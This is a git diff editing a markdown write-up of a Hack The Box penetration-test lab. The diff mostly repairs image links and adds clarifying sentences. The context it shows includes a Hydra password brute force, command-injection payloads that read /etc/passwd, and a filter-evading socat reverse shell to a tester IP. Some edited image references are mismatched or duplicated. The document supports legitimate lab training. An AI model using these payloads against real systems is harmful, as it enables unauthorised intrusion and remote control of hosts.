@@ -269,7 +269,9 @@ HTB{REDACTED}
 
 ## ir.inlanefreight.local
 
-![](./vhosts/ir/ir1.png
+The page displayed is powered by WordPress:
+
+![](./vhosts/ir/ir1.png)
 
 ```bash
 curl -s http://ir.inlanefreight.local | grep WordPress
@@ -316,7 +318,7 @@ HTB{REDACTED}
 
 A login form is presented:
 
-./vhosts/monitoring/monitoring0.png
+![](./vhosts/monitoring/monitoring0.png)
 
 Brute forcing with Hydra reveals valid credentials:
 
@@ -328,21 +330,21 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt monitoring.inlanefreight.loca
 [80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
 ```
 
-After login, a very limited shell-like interface is accessible:
+After login, a very limited shell interface is accessible:
 
-./vhosts/monitoring/monitoring1.png
+![](./vhosts/monitoring/monitoring1.png)
 
 Enumerating the source code of the page:
 
-./vhosts/monitoring/monitoring2.png
+![](./vhosts/monitoring/monitoring2.png)
 
 `main.js` discloses an endpoint that runs a `ping` command server-side, and a function that calls it with a user-controllable IP, suggesting a possible command injection:
 
-./vhosts/monitoring/monitoring3.png
+![](./vhosts/monitoring/monitoring4.png)
 
 Testing the endpoint confirms the ping functionality works as expected:
 
-./vhosts/monitoring/monitoring4.png
+![](./vhosts/monitoring/monitoring4.png)
 
 Command injection is confirmed using `%0a` (URL-encoded newline), which is not blacklisted:
 
@@ -350,7 +352,7 @@ Command injection is confirmed using `%0a` (URL-encoded newline), which is not b
 /ping.php?ip=127.0.0.1%0acat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
 ```
 
-./vhosts/monitoring/monitoring5.png
+![](./vhosts/monitoring/monitoring5.png)
 
 Reading the source of `ping.php` itself, via the same injection:
 
@@ -358,7 +360,7 @@ Reading the source of `ping.php` itself, via the same injection:
 GET /ping.php?ip=127.0.0.1%0acat${IFS}ping.php
 ```
 
-./vhosts/monitoring/monitoring6.png
+![](./vhosts/monitoring/monitoring6.png)
 
 ```php
 <?php
@@ -391,9 +393,9 @@ if (isset($_GET['ip'])) {
 ?>
 ```
 
-The filter blacklists several operators and command names but does not block `/`-less binaries like `socat`:
+The filter blacklists several operators and command names but does not block `/`-less binaries like `socat`, which is present on the host:
 
-./vhosts/monitoring/monitoring7.png
+![](./vhosts/monitoring/monitoring7.png)
 
 A socat reverse shell listener is started locally and adapted to evade the filter (operators quoted character-by-character, `${IFS}` used instead of spaces):
 
@@ -405,7 +407,7 @@ socat TCP:10.10.14.111:9001 EXEC:bash
 GET /ping.php?ip=127.0.0.1%0aso'c'at${IFS}TCP:10.10.14.111:9001${IFS}EXEC:bash
 ```
 
-./vhosts/monitoring/monitoring8.png
+![](./vhosts/monitoring/monitoring0.png)
 
 A shell as `webdev` is obtained on host `dmz01`:
 
@@ -432,7 +434,7 @@ HTB{REDACTED}   (/home/srvadm/flag.txt, shown as a non-HTB formatted hash in the
 HTB{REDACTED}   (/srv/ftp/flag.txt)
 ```
 
-> [!note] This shell is kept for later local privilege escalation and pivoting into the internal networks (not covered in this part of the report).
+> [!note] This shell is kept for later local privilege escalation and pivoting into the internal networks.
 
 ---
 
@@ -440,15 +442,15 @@ HTB{REDACTED}   (/srv/ftp/flag.txt)
 
 This vhost was disclosed via the GitLab `/explore` page. A login is presented:
 
-./vhosts/shopdev2/shopdev1.png
+![](./vhosts/shopdev2/shopdev1.png)
 
 The page is accessible with `admin:admin`:
 
-./vhosts/shopdev2/shopdev2.png
+![](./vhosts/shopdev2/shopdev2.png)
 
 Selecting items and going to checkout shows the "Complete Purchase" action accepts an XML body, as seen in Burp:
 
-./vhosts/shopdev2/shopdev3.png
+![](./vhosts/shopdev2/shopdev3.png)
 
 ./vhosts/shopdev2/shopdev4.png
 
